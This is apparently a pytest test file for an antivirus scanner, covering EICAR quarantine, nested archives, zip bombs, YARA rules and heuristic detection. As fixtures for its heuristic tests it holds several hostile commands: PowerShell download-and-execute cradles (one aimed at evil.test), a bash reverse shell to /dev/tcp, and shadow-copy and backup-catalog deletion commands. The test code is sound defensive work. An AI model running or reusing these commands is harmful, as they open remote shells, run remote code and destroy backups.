import io
import tarfile
import zipfile

from sentinel_vision.engines.base import Detection, ScanObject, Severity
from sentinel_vision.engines.heuristics import HeuristicEngine, shannon_entropy
from sentinel_vision.engines.yara_engine import YaraEngine, _severity_from_meta


def test_eicar_detected_by_hash_and_yara_and_quarantined(sentinel, workdir, eicar):
    f = workdir / "eicar.com"
    f.write_bytes(eicar)
    res = sentinel.scanner.scan_file(f)[0]
    engines = {d.engine for d in res.detections}
    assert {"hash", "yara"} <= engines
    assert res.action == "quarantined"
    assert not f.exists()
    assert len(sentinel.quarantine.list()) == 1


def test_clean_file_has_no_detections_and_is_cached(sentinel, workdir):
    f = workdir / "readme.txt"
    f.write_text("Just a perfectly normal text file.\n")
    res = sentinel.scanner.scan_file(f)[0]
    assert res.detections == [] and res.error == ""
    again = sentinel.scanner.scan_file(f)[0]
    assert again.skipped.startswith("unchanged")
    sentinel.db.bump_signature_version()  # new signatures => rescan
    assert sentinel.scanner.scan_file(f)[0].skipped == ""


def test_report_only_mode_keeps_file(sentinel, workdir, eicar):
    sentinel.settings.auto_quarantine = False
    f = workdir / "eicar.txt"
    f.write_bytes(eicar)
    res = sentinel.scanner.scan_file(f)[0]
    assert res.infected and res.action == "reported" and f.exists()


def test_detection_inside_zip_and_nested_tar(sentinel, workdir, eicar):
    tar_buf = io.BytesIO()
    with tarfile.open(fileobj=tar_buf, mode="w:gz") as tf:
        info = tarfile.TarInfo("deep/eicar.bin")
        info.size = len(eicar)
        tf.addfile(info, io.BytesIO(eicar))
    z = workdir / "bundle.zip"
    with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("docs/readme.txt", "hello")
        zf.writestr("payload.tar.gz", tar_buf.getvalue())
    results = sentinel.scanner.scan_file(z)
    assert results[0].infected
    assert any("payload.tar.gz!deep/eicar.bin" in r.path for r in results[1:])
    assert results[0].action == "quarantined"


def test_zip_bomb_is_flagged_not_expanded(sentinel, workdir):
    sentinel.settings.auto_quarantine = False
    z = workdir / "bomb.zip"
    chunk = b"\0" * (8 * 1024 * 1024)
    with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
        with zf.open("zeros.bin", "w", force_zip64=True) as fh:
            for _ in range(140):  # 1.1 GB of zeros -> ~1 MB on disk
                fh.write(chunk)
    assert z.stat().st_size < 5 * 1024 * 1024
    res = sentinel.scanner.scan_file(z)[0]
    assert any(d.name == "Archive.Bomb" for d in res.detections)


def test_big_legit_archives_are_not_flagged(sentinel, workdir):
    """Jars and icon packs have thousands of entries; hitting a coverage limit is not a detection."""
    sentinel.settings.archive_max_members = 50
    z = workdir / "icons.zip"
    with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
        for i in range(400):
            zf.writestr(f"icons/{i}.svg", "<svg>" + " " * 5000 + "</svg>")
    res = sentinel.scanner.scan_file(z)[0]
    assert res.detections == [] and res.error == ""


def test_oversized_files_are_skipped(sentinel, workdir):
    sentinel.settings.max_file_size_mb = 1
    f = workdir / "big.bin"
    f.write_bytes(b"a" * (2 * 1024 * 1024))
    assert "larger than" in sentinel.scanner.scan_file(f)[0].skipped


def test_own_install_and_data_dirs_are_excluded(sentinel):
    from sentinel_vision.config import data_dir
    from sentinel_vision.scanner import PACKAGE_DIR

    assert sentinel.scanner.is_excluded(str(PACKAGE_DIR / "engines" / "heuristics.py"))
    assert sentinel.scanner.is_excluded(str(data_dir() / "quarantine" / "x.svq"))


# ----------------------------------------------------------------------------- heuristics


def _heur(name: str, data: bytes, threshold: int = 60):
    return HeuristicEngine(threshold).scan(ScanObject(name, data=data))


def test_heuristic_masquerading_executable():
    det = _heur("invoice.pdf.exe", b"MZ" + b"\0" * 200)
    assert det and det[0].name.startswith("Heuristic.")


def test_heuristic_rtlo_filename():
    assert _heur("photo\u202egpj.exe", b"hello")


def test_heuristic_powershell_cradle():
    script = b"powershell -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')\""
    det = _heur("run.ps1", script)
    assert det and det[0].severity >= Severity.MEDIUM


def test_heuristic_reverse_shell():
    assert _heur("x.sh", b"#!/bin/bash\nbash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n")


def test_heuristic_benign_script_is_clean():
    assert _heur("build.sh", b"#!/bin/sh\nset -e\nmake -j4\necho done\n") == []


def test_heuristic_ransomware_strings():
    assert _heur("a.bin", b"cmd /c vssadmin delete shadows /all /quiet & wbadmin delete catalog -quiet")


def test_entropy():
    assert shannon_entropy(b"") == 0
    assert shannon_entropy(b"aaaa") == 0
    assert 7.9 < shannon_entropy(bytes(range(256)) * 4) <= 8.0


# ----------------------------------------------------------------------------- yara


def test_yara_custom_rule_dir(isolated_home):
    from sentinel_vision.config import sub_dir

    (sub_dir("rules/custom") / "mine.yar").write_text(
        'rule My_Test { meta: severity = "high" strings: $a = "sentinel-unit-test-marker" condition: $a }'
    )
    (sub_dir("rules/custom") / "broken.yar").write_text("rule broken { condition: ")
    eng = YaraEngine()
    assert any("broken.yar" in s for s in eng.skipped_files)  # bad files never break the engine
    hits = eng.scan(ScanObject("x.txt", data=b"xx sentinel-unit-test-marker xx"))
    assert [h.name for h in hits] == ["My_Test"]


def test_yara_severity_mapping():
    assert _severity_from_meta({"score": 80}) == Severity.HIGH
    assert _severity_from_meta({"score": 65}) == Severity.MEDIUM
    assert _severity_from_meta({"score": 10}) == Severity.INFO
    assert _severity_from_meta({"severity": "critical"}) == Severity.CRITICAL
    assert _severity_from_meta({}) == Severity.MEDIUM


def test_signature_vs_heuristic_classification():
    assert Detection("hash", "x", Severity.CRITICAL).is_signature
    assert Detection("yara", "x", Severity.HIGH).is_signature
    assert not Detection("yara", "x", Severity.LOW).is_signature
    assert not Detection("heuristics", "x", Severity.HIGH).is_signature


def test_yara_is_safe_under_concurrent_scans(eicar):
    """libyara keeps externals on the Rules object; per-thread copies must keep parallel scans correct."""
    from concurrent.futures import ThreadPoolExecutor

    eng = YaraEngine()
    objs = [ScanObject(f"file{i}.bin", data=eicar if i % 2 == 0 else b"clean data %d" % i) for i in range(200)]
    with ThreadPoolExecutor(8) as pool:
        results = list(pool.map(eng.scan, objs))
    for i, hits in enumerate(results):
        assert bool(hits) == (i % 2 == 0)


def test_heuristics_ignore_library_names_and_tool_help_text():
    assert _heur("Windows.Data.Pdf.dll", b"MZ" + b"\0" * 200) == []
    help_text = b"MZ" + b"\0" * 64 + b"Example: vssadmin delete shadows /for=c: /oldest"
    assert _heur("vssadmin.exe.mui", help_text, threshold=1) == []
    two_tools = b"MZ" + b"\0" * 64 + b"vssadmin delete shadows /all /quiet\0wbadmin delete catalog -quiet"
    assert _heur("payload.exe", two_tools)


def test_heuristic_cradle_needs_actual_composition():
    module = b"function Get-Data { Invoke-WebRequest -Uri $u -OutFile $f }\n" * 50 + b"Invoke-Expression $generated\n"
    assert _heur("module.ps1", module) == []
    assert _heur("x.ps1", b"I`E`X (New-Object Net.WebClient).DownloadString('http://x/a')", threshold=40)
    assert _heur("y.ps1", b"irm https://evil.test/p.ps1 | iex", threshold=40)
